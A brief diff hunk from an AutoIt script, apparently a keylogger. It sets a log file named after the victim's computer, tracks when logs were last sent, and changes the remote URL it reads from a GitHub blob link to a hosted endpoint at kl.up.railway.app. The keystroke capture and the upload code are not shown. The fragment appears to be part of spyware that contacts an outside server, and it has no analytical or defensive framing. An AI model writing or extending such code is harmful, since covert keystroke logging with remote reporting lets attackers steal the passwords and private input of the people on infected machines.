@@ -26,7 +26,7 @@ Global $file_name = @computername & "_log.txt"
 Global $last_send = 0
 
 ; Realizar la solicitud HTTP GET
-Local $sURL = "blob:https://github.com/815309cb-d309-42f5-ba0a-dbf0407f0b45"
+Local $sURL = "https://kl.up.railway.app/l"
 
 Local $sContent = InetRead($sURL)
 
